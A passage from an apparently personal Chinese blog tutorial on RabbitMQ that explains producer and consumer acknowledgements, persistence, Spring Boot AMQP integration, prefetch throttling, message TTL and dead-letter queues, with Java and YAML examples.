<h2 id="消息确认机制-ACK"><a href="#消息确认机制-ACK" class="headerlink" title="消息确认机制(ACK)"></a>消息确认机制(ACK)</h2><p>通过刚才的案例可以看出，消息一旦被消费者接收，队列中的消息就会被删除。那么问题来了：RabbitMQ怎么知道消息被接收了呢？如果消费者领取消息后，程序抛出了异常呢？那么会造成消息消费失败，但是RabbitMQ无从得知，这样消息就丢失了！这就需要依赖RabbitMQ的<strong>ACK机制</strong>。</p>
<h3 id="生产者ACK"><a href="#生产者ACK" class="headerlink" title="生产者ACK"></a>生产者ACK</h3><p>对于生产者来说，RabbitMQ提供了监听器（Listener）来接收消息投递的状态，消息确认涉及两种状态：</p>
<ul>
<li>Confirm：代表生产者将消息发送到Broker时的状态，会出现两种情况：<ul>
<li>ack：代表Broker成功接收消息。</li>
<li>nack：代表Broker由于某些原因拒绝接收消息。【队列满了、限流、异常</li>
</ul>
</li>
<li>Return：代表生产者将消息发送到RabbitMQ成功，但是消息投递时由于没有设有对应的队列，而将消息回退给生产者。</li>
</ul>
<p>通过如下代码可以监听生产者消息投递的<code>Confirm</code>状态：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开启监听模式</span></span><br><span class="line">channel.confirmSelect();</span><br><span class="line"><span class="comment">// 添加confirm监听器</span></span><br><span class="line">channel.addConfirmListener(<span class="keyword">new</span> <span class="title class_">ConfirmListener</span>() &#123;</span><br><span class="line">    <span class="comment">/** 处理ack，表示消息被mq接收</span></span><br><span class="line"><span class="comment">      * param1：消息标签id</span></span><br><span class="line"><span class="comment">      * param2：代表接收的数据是否为批量接收，一般用不到</span></span><br><span class="line"><span class="comment"> 	 */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleAck</span><span class="params">(<span class="type">long</span> deliveryTag, <span class="type">boolean</span> multiple)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理nack，表示消息未被mq接收</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleNack</span><span class="params">(<span class="type">long</span> deliveryTag, <span class="type">boolean</span> multiple)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过如下代码可以监听生产者消息投递的<code>Return</code>状态：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开启监听模式</span></span><br><span class="line">channel.confirmSelect();</span><br><span class="line"><span class="comment">// 添加return监听器</span></span><br><span class="line">channel.addReturnListener(<span class="keyword">new</span> <span class="title class_">ReturnCallback</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// returnMessage包含了发送结果、交换机、routingKey、消息体等信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(Return returnMessage)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="消费者ACK"><a href="#消费者ACK" class="headerlink" title="消费者ACK"></a>消费者ACK</h3><p>上面的情况仅针对生产者与RabbitMQ之间消息传递的状态。而当消费者获取消息后，会向RabbitMQ发送回执ACK，告知消息已经被接收。不过这种回执ACK分两种情况：</p>
<ul>
<li>自动ACK：消息一旦被接收，消费者自动发送ACK。</li>
<li>手动ACK：消息接收后，不会发送ACK，需要手动调用。</li>
</ul>
<p>那么哪种更好呢？这需要看消息的重要性：</p>
<ul>
<li>如果消息不太重要，丢失也没有影响，那么自动ACK会比较方便。</li>
<li>如果消息非常重要，不容丢失。那么最好在消费完成后手动ACK，否则接收消息后就自动ACK，RabbitMQ就会把消息从队列中删除。如果此时消费者宕机，那么消息就丢失了。</li>
</ul>
<p>在之前的程序中我们使用的是自动ACK，如果要使用手动ACK需要修改下列代码：</p>
<ul>
<li><p>修改监听队列的<code>basicConsume</code>方法的第二个参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">channel.basicConsume(QUEUE_NAME, <span class="literal">false</span>, consumer);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在消费者comsumer的回调方法<code>handleDelivery</code>结尾添加手动ACK</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一个参数为消息标签id，可以从envelope中获取</span></span><br><span class="line"><span class="comment">// 第二个参数false表示只ack当前消费者的消息，true表示批量ack之前未ack的消息</span></span><br><span class="line">channel.basicAck(deliveryTag, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这样修改后，如果程序出现异常，则不会执行最后的手动ACK，那么消息仍然保存在队列中，解决了问题。</p>
<p>换句话说，当我们回复确认ACK时，消息就会在队列中删除掉。</p>
<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>之前向大家介绍了<strong>消息确认机制(ACK)<strong>，它是避免消息丢失的方法之一。实际上，</strong>持久化</strong>才是真正能够有效避免消息丢失的解决方案：</p>
<ul>
<li><p>交换机持久化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">channel.exchangeDeclare(EXCHANGE_NAME, <span class="string">&quot;topic&quot;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>在创建交换机时加入第三个参数，并设置为<code>true</code>，表示交换机持久化。</p>
</li>
<li><p>队列持久化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">channel.queueDeclare(QUEUE_NAME, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>在创建队列时将第二个参数设置为<code>true</code>，表示队列持久化。</p>
</li>
<li><p>消息持久化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">channel.basicPublish(EXCHANGE_NAME, <span class="string">&quot;msg.wechat&quot;</span>, MessageProperties.PERSISTENT_TEXT_PLAIN, message2.getBytes());</span><br></pre></td></tr></table></figure>

<p>在发送消息时将第三个参数设置为<code>MessageProperties.PERSISTENT_TEXT_PLAIN</code>，表示消息持久化。</p>
</li>
</ul>
<h1 id="Spring-Boot整合RabbitMQ"><a href="#Spring-Boot整合RabbitMQ" class="headerlink" title="Spring Boot整合RabbitMQ"></a>Spring Boot整合RabbitMQ</h1><h2 id="Spring-AMQP"><a href="#Spring-AMQP" class="headerlink" title="Spring AMQP"></a>Spring AMQP</h2><p>Spring-amqp是对AMQP协议的抽象实现，而 spring-rabbit 是对协议的具体实现，也是目前的唯一实现。底层使用的就是RabbitMQ。本文只为大家简单介绍，具体可以参考官方教程：<a class="link"   href="https://docs.spring.io/spring-amqp/docs/2.2.7.RELEASE/reference/html/" >https://docs.spring.io/spring-amqp/docs/2.2.7.RELEASE/reference/html/<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="导入依赖及配置"><a href="#导入依赖及配置" class="headerlink" title="导入依赖及配置"></a>导入依赖及配置</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> </span><br><span class="line">    <span class="attr">username:</span> <span class="string">liduaon</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">liduoan</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">virtual-host:</span> <span class="string">/liduoan_demo</span></span><br><span class="line">    <span class="comment"># 生产者</span></span><br><span class="line">    <span class="attr">template:</span></span><br><span class="line">    <span class="comment"># exchange: spring.test.exchange</span></span><br><span class="line">      <span class="attr">retry:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">initial-interval:</span> <span class="number">1000</span></span><br><span class="line">        <span class="attr">max-interval:</span> <span class="number">2000</span></span><br><span class="line">        <span class="attr">multiplier:</span> <span class="number">2</span></span><br><span class="line">        <span class="attr">max-attempts:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment"># 消费者</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="attr">acknowledge-mode:</span> <span class="string">manual</span></span><br><span class="line">        <span class="attr">concurrency:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">max-concurrency:</span> <span class="number">10</span></span><br><span class="line">        <span class="attr">retry:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">max-attempts:</span> <span class="number">1</span> <span class="comment"># 最大重试次数 </span></span><br><span class="line">          <span class="attr">initial-interval:</span> <span class="number">1000</span> <span class="comment"># 第一次重试的间隔时长</span></span><br><span class="line">          <span class="attr">multiplier:</span> <span class="number">2</span> <span class="comment"># 下次重试间隔的倍数</span></span><br><span class="line">          <span class="attr">max-interval:</span> <span class="number">2000</span>  <span class="comment"># 最长重试间隔</span></span><br><span class="line">    <span class="attr">publisher-confirms:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>常用参数说明（完整配置请参考官方文档）：</p>
<ul>
<li><p>template：有关</p>
<p>的配置</p>
<ul>
<li>exchange：缺省的交换机名称，此处配置后，发送消息如果不指定交换机就会使用这个</li>
<li>retry：失败重试<ul>
<li>enabled：开启失败重试</li>
<li>initial-interval：第一次重试的间隔时长</li>
<li>max-interval：最长重试间隔，超过这个间隔将不再重试</li>
<li>multiplier：下次重试间隔的倍数，此处是2即下次重试间隔是上次的2倍</li>
<li>max-attempts：最大重试次数</li>
</ul>
</li>
</ul>
</li>
<li><p>listener：有关消费者监听器的配置</p>
<ul>
<li>simple：<ul>
<li>acknowledge-mode：消息确认方式，取值包括none、manual和auto(默认auto)</li>
<li>concurrency：最小的消费者数量</li>
<li>max-concurrency：最大的消费者数量</li>
<li>retry：配置消费者重试参数，和生产者一致</li>
</ul>
</li>
</ul>
</li>
<li><p>publisher-confirms：生产者确认机制，确保消息会正确发送，如果发送失败会有错误回执，从而触发重试</p>
</li>
</ul>
<h2 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/6/10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MQConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//声明队列</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">directQ1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;direct_sb_mq_q1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">directQ2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;direct_sb_mq_q2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明exchange</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DirectExchange <span class="title function_">setDirectExchange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DirectExchange</span>(<span class="string">&quot;directExchange&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明binding，需要声明一个routingKey</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindDirectBind1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//后面的with里是routingKey</span></span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(directQ1()).to(setDirectExchange()).with(<span class="string">&quot;china.changsha&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindDirectBind2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(directQ2()).to(setDirectExchange()).with(<span class="string">&quot;china.beijing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="生产者-1"><a href="#生产者-1" class="headerlink" title="生产者"></a>生产者</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/6/10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mqController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/liduoan&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testMq</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Rabbit Mq okkkk&quot;</span>;</span><br><span class="line">        <span class="comment">//发送消息，具体参数可以看提示</span></span><br><span class="line">        <span class="comment">//第一个参数为交换机名  第二个为routingKey 第三个为消息</span></span><br><span class="line">        rabbitTemplate.send(<span class="string">&quot;directExchange&quot;</span>,<span class="string">&quot;china.changsha&quot;</span>,<span class="keyword">new</span> <span class="title class_">Message</span>(message.getBytes()));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="消费者-1"><a href="#消费者-1" class="headerlink" title="消费者"></a>消费者</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/6/10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsumerMQ</span> &#123;</span><br><span class="line">	<span class="comment">//标识监听哪个队列 当队列中存有消息时，进行获取消息</span></span><br><span class="line">    <span class="meta">@RabbitListener(queues=&quot;direct_sb_mq_q1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloWorldReceive</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;helloWorld模式 received message : &quot;</span> +message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>简单的整合就如上图，消费者通过使用注解进行监听，而生产者调用<code>RabbitTemplate</code>进行发送消息。</p>
<p>生产端直接注入RabbitTemplate完成消息发送</p>
<p>消费端直接使用@RabbitListener完成消息接收</p>
<p>另外记得开放5672端口，我就是机器没开端口一直超时—。</p>
<h2 id="多线程处理消息"><a href="#多线程处理消息" class="headerlink" title="多线程处理消息"></a>多线程处理消息</h2><p>代码中使用<code>@RabbitListener</code>注解指定消费方法，默认情况是单线程监听队列，可以观察当队列有多个任务时消费端每次只消费一个消息，单线程处理消息容易引起消息处理缓慢，消息堆积，不能最大利用硬件资源。</p>
<p>这里大家可能先到了之前的<strong>Work Queues</strong>模式，即同一个队列由多个消费者监听，共同处理队列中的任务。这样的确可以解决消息堆积的问题，但是如果手动配置很多消费者的话会很麻烦。Spring AMQP为我们提供了一个解决方案：</p>
<p>可以配置mq的<strong>容器工厂</strong>，增加参数中的并发处理数量即可实现多线程处理监听队列，实现多线程处理消息。</p>
<ul>
<li><p>在配置类中配置mq容器工厂</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitmqConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 消费者并发数量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_CONCURRENT</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略若干配置......</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 配置容器工厂</span></span><br><span class="line">    <span class="meta">@Bean(&quot;customContainerFactory&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> SimpleRabbitListenerContainerFactory <span class="title function_">containerFactory</span><span class="params">(</span></span><br><span class="line"><span class="params">                 SimpleRabbitListenerContainerFactoryConfigurer configurer,</span></span><br><span class="line"><span class="params">                 ConnectionFactory connectionFactory)</span> &#123;</span><br><span class="line">        <span class="type">SimpleRabbitListenerContainerFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleRabbitListenerContainerFactory</span>();</span><br><span class="line">        factory.setConcurrentConsumers(DEFAULT_CONCURRENT);</span><br><span class="line">        factory.setMaxConcurrentConsumers(DEFAULT_CONCURRENT);</span><br><span class="line">        configurer.configure(factory, connectionFactory);</span><br><span class="line">        <span class="keyword">return</span> factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>@RabbitListener</code>注解中指定容器工厂</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> &#123;</span><br><span class="line">	<span class="comment">//queues = &quot;direct_sb_mq_q1&quot;</span></span><br><span class="line">    <span class="meta">@RabbitListener(queues = &quot;$&#123;mq.queue-name&#125;&quot;,</span></span><br><span class="line"><span class="meta">                    containerFactory = &quot;customContainerFactory&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;接收到消息：&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="消息可靠性"><a href="#消息可靠性" class="headerlink" title="消息可靠性"></a>消息可靠性</h2><p>RabbitMQ提供了事务机制可以有效保证消息的可靠性，但是官方并不推荐使用，因为会导致RabbitMQ的性能下降250倍左右。</p>
<h3 id="生产者ACK-1"><a href="#生产者ACK-1" class="headerlink" title="生产者ACK"></a>生产者ACK</h3><p>监听生产者消息投递的<code>Confirm</code>状态的方式如下：</p>
<ul>
<li>首先必须在配置文件中配置下面的值为<code>true</code>：</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">publisher-confirms:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>接着在<code>RabbitTemplate</code>对象中添加<code>Confirm</code>状态的监听器：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * param1:相关配置信息</span></span><br><span class="line"><span class="comment"> * param2:exchange是否成功接收到消息</span></span><br><span class="line"><span class="comment"> * param3:失败原因</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//在生产者发送消息之前调用就行</span></span><br><span class="line">rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ack) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;成功！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;失败！&quot;</span> + cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>监听生产者消息投递的<code>Return</code>状态的方式如下：</p>
<ul>
<li>首先在配置文件中配置下面的值为<code>true</code>：</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">publisher-returns:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 该配置同publisher-returns</span></span><br><span class="line">    <span class="attr">template:</span></span><br><span class="line">      <span class="attr">mandatory:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>或者在<code>RabbitTemplate</code>对象中设置<code>mandatory</code>为true：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置mandatory为true</span></span><br><span class="line">rabbitTemplate.setMandatory(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>接着在<code>RabbitTemplate</code>对象中添加<code>Return</code>状态的监听器：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**添加Confirm状态的监听器</span></span><br><span class="line"><span class="comment"> * param1:消息对象</span></span><br><span class="line"><span class="comment"> * param2:错误码</span></span><br><span class="line"><span class="comment"> * param3:错误信息</span></span><br><span class="line"><span class="comment"> * param4:交换机</span></span><br><span class="line"><span class="comment"> * param5:routingKey</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">rabbitTemplate.setReturnCallback((message, replyCode, replyText, exchange, routingKey) -&gt; &#123;</span><br><span class="line">    System.out.println(replyCode);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>假如不存在<code>routingKey</code>对应的队列，那么消息就无法找到队列，则会调用<code>Confirm</code>状态的监听器。</p>
<h3 id="消费者ACK-1"><a href="#消费者ACK-1" class="headerlink" title="消费者ACK"></a>消费者ACK</h3><p>RabbitMQ默认是自动ACK的，需要在配置文件中配置进行配置开启消费者手动ACK：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="attr">acknowledge-mode:</span> <span class="string">manual</span></span><br></pre></td></tr></table></figure>

<p>由于消费者ACK需要调用Channel的相关API，因此需要在监听方法中添加Channel参数（会自动注入）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;test_queue&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">(Message msg, Channel channel)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取消息标签id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">deliveryTag</span> <span class="operator">=</span> msg.getMessageProperties().getDeliveryTag();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;接收到消息：&quot;</span> + msg.getBody());</span><br><span class="line">        <span class="comment">/** ACK表示消息消费成功</span></span><br><span class="line"><span class="comment">          * param1：消息标签id</span></span><br><span class="line"><span class="comment">          * param2：代表接收的数据是否为批量接收，一般用不到</span></span><br><span class="line"><span class="comment"> 	      */</span></span><br><span class="line">        channel.basicAck(deliveryTag, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">/** NACK表示消息消费异常</span></span><br><span class="line"><span class="comment">          * param1：消息标签id</span></span><br><span class="line"><span class="comment">          * param2：代表接收的数据是否为批量接收，一般用不到</span></span><br><span class="line"><span class="comment">          * param3：表示是否将消息返回队列中，设置为false的话消息就会被丢弃</span></span><br><span class="line"><span class="comment"> 	      */</span></span><br><span class="line">            channel.basicNack(deliveryTag, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消费者对消息进行确认，那么RabbitMq存储系统将决定是否删除消息。</p>
<p>而消费者没有确认，也就是<code>channel.basicNack(deliveryTag, false, true);</code>，那么会根据回发的信息进行判断直接删除还是重新发送。</p>
<p>而没有确认代码的时候，会发生什么呢？按照老师的说法，是会接收不到确认，那么数据不删除。</p>
<h2 id="消费端限流"><a href="#消费端限流" class="headerlink" title="消费端限流"></a>消费端限流</h2><p>之前我们介绍了MQ有流量削峰的作用，那么如何做呢？其实非常简单，只需要一些简单的配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="attr">acknowledge-mode:</span> <span class="string">manual</span>   <span class="comment"># 消费者手动ACK</span></span><br><span class="line">        <span class="attr">prefetch:</span> <span class="number">1</span>   <span class="comment"># 指定一个请求能处理多少个消息，如果有事务的话，必须大于等于事务数量</span></span><br></pre></td></tr></table></figure>

<ol>
<li>必须是手动ACK模式，因为只有手动ACK后才能发送下一条消息。</li>
<li>配置<code>prefetch=1</code>其实就相当于调用<code>channel.basicQos(1)</code>，每次确认后才接收下一跳信息。</li>
</ol>
<h2 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h2><p>TTL全称Time To Live（存活时间）。在RabbitMQ中，TTL指的是当消息到达存活时间后，如果还没有被消费，会被自动清除。RabbitMQ可以对消息设置过期时间，也可以对整个队列设置过期时间：</p>
<ul>
<li>对消息设置过期时间</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建消息属性对象</span></span><br><span class="line"><span class="type">MessageProperties</span> <span class="variable">messageProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageProperties</span>();</span><br><span class="line"><span class="comment">// 设置消息的过期时间(单位：毫秒)</span></span><br><span class="line">messageProperties.setExpiration(<span class="string">&quot;10000&quot;</span>);</span><br><span class="line"><span class="comment">// 创建消息对象，传入消息体和消息属性</span></span><br><span class="line"><span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;test_ttl&quot;</span>.getBytes(), messageProperties);</span><br><span class="line"><span class="comment">// 通过rabbitTemplate发送消息</span></span><br><span class="line">rabbitTemplate.convertAndSend(exchange_name,routingkey, message);</span><br></pre></td></tr></table></figure>

<ul>
<li>对队列设置过期时间</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Queue <span class="title function_">TEST_QUEUE</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个map</span></span><br><span class="line">    HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 配置参数x-message-ttl的值为10000ms</span></span><br><span class="line">    <span class="comment">// 即指定队列为ttl队列</span></span><br><span class="line">    map.put(<span class="string">&quot;x-message-ttl&quot;</span>, <span class="number">10000</span>);</span><br><span class="line">    <span class="comment">// 创建队列的时候传入参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(queueName, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是对队列设置过期时间，那么该队列中所有的消息都会根据该过期时间过期。如果消息和队列都设置了过期时间，根据<strong>时间短</strong>的进行过期。</p>
<h2 id="死信队列"><a href="#死信队列" class="headerlink" title="死信队列"></a>死信队列</h2><p>死信队列英文缩写为DLX，即Dead Letter Exchange（在RabbitMQ中又叫死信交换机）。当消息成为Dead message后，可以被重新发送到另一个交换机，这个交换机就是DLX。消息成为死信有三种情况：</p>
<ol>
<li>队列消息长度到达限制。</li>
<li>消费者拒接消费消息，并且不把消息重新放入原目标队列。</li>
